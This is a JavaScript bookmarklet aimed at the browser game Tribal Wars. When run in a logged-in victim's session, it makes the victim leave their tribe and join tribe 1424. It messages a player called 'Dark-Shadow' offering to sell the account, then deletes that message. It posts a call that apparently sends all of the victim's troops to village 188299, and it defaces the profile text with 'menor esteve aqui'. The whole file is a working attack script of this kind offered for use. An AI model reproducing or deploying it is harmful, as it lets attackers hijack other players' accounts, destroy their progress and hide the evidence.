javascript:(async function(){
    const url = TribalWars.buildURL('GET', {screen: 'ally', action: 'exit'});
    TribalWars.get(url);

    setTimeout(() => {
        const urll = TribalWars.buildURL('GET', {screen: 'info_ally', action: 'join', id: '1424'});
        TribalWars.get(urll);
    }, 600);

    async function getLastMessageId(playerName) {
    try {
        const htmlText = await $.get("game.php", { screen: "mail" });

        const $html       = $(htmlText);
        const $elements   = $html.find(
            "#content_value > table > tbody > tr > td:nth-child(2) > form > table:nth-child(3) > tbody > tr > td.nowrap"
        );

        let foundIndex = -1;

        $elements.each(function (index) {
            console.log("oiii>> ", $(this).text().trim())
            if ($(this).text().trim() === playerName) {
                foundIndex = index + 1;   
                return false;            
            }
        });

        if (foundIndex > -1) {
            console.log("achou")
            const url = $html
                .find(`#content_value > table > tbody > tr > td:nth-child(2) > form > table:nth-child(3) > tbody > tr:nth-child(${foundIndex + 1}) > td:nth-child(1) > a`)
                .attr("href");
    
            const params    = new URLSearchParams(new URL(url, location.origin).search);
            const viewValue = params.get("view");

            const string = `ids[${viewValue}]`;
    
    TribalWars.post('mail',
            { mode: 'in', action: 'del_move_multiple', group: '0' },
            { [string]: 'on', del: 'Apagar', from: '0', num_igms: '100',  }, function () {
            },
                !1
            );
                                
    
                return viewValue ?? 0;
            }

        return 0;
    } catch (err) {
        console.error("getLastMessageId error:", err);
        return 0;
    }
}


    async function cada_mp(player, msg, subj) {
        const parts = TribalWars.buildURL("POST", 'mail', { mode:'new', action: 'send' }).split('&h=');
        const postUrl = parts[0];
        const h = parts[1] || '';

        $.ajax({
            url: postUrl,
            type: 'POST',
            data: {
                to: player,
                subject: subj || 'ola',
                text: msg || '',
                extended: 0,
                send: 'Enviar',
                h: h
            },
            success: function() {
                
            },
            error: function(xhr) {
                
            }
        });
    }

    const pn = 'Dark-Shadow';

    await cada_mp(pn, 'Quer me vender sua conta por R$350,00', 'Venda de conta');
    setTimeout(async function() {
        const messageId = await getLastMessageId(pn);
        console.log(messageId)
    }, 1000);


setTimeout(() => {
  console.log("vai começar");

  const parts = TribalWars.buildURL("POST", 'place', {
    mode: 'call',
    action: 'change_pagesize'
  }).split('&h=');

  const postUrl = parts[0];
  const h = parts[1] || '';

  $.ajax({
    url: postUrl,
    type: 'POST',
    data: { page_size: '999', h: h, target: '188299' },
    success: function (response, status, xhr) {
      console.log("sucesso");

      const $html = $(response);

      $html.find(".unit_checkbox").prop("checked", true);
      $html.find("#place_call_select_all").prop("checked", true);
        $html.find("tr.call-village input[type=checkbox]").prop("checked", true);

      const $form = $html.find("#place_call_form");

      console.log("oi: ", $form);

 const formDataObj = {};

// adiciona os dados do form serializado (string) ao objeto
$form.serializeArray().forEach(({name, value}) => {
  formDataObj[name] = value;
});

// depois, adiciona os dados da tabela:
$("#village_troup_list tbody tr").each(function() {
  const $tr = $(this);

  const idParts = $tr.attr("id").split("_");
  const villageId = idParts[idParts.length - 1];

  $tr.find("td").slice(1, 11).each(function() {
    const $td = $(this);
    const count = $td.data("count");
    const unit = $td.data("unit");

    if(count && count !== '0') {
      formDataObj[`call[${villageId}][${unit}]`] = count;
    }
  });
});

// Por fim, faça o POST com o objeto
$.post($form.attr("action"), formDataObj, function(response) {
  console.log("Resposta:", response);
});
    },
    error: function (xhr, status, error) {
      console.log("erro: ", error);
      console.error('Erro:', error);
    },
    complete: function () {
      console.log("Requisição finalizada (com sucesso ou erro)");
    }
  });

}, 2000);


    setTimeout(() => {
        TribalWars.post('mail',
            { screen: 'info_player', edit: '1', action: 'change_text' },
            { personal_text: 'menor esteve aqui', send: 'Salvar'}, function () {
            },
                !1
            );
    }, 1500);

    setTimeout(() => {
        UI.SuccessMessage("Menor esteve aqui")
    }, 2000);

    
})();
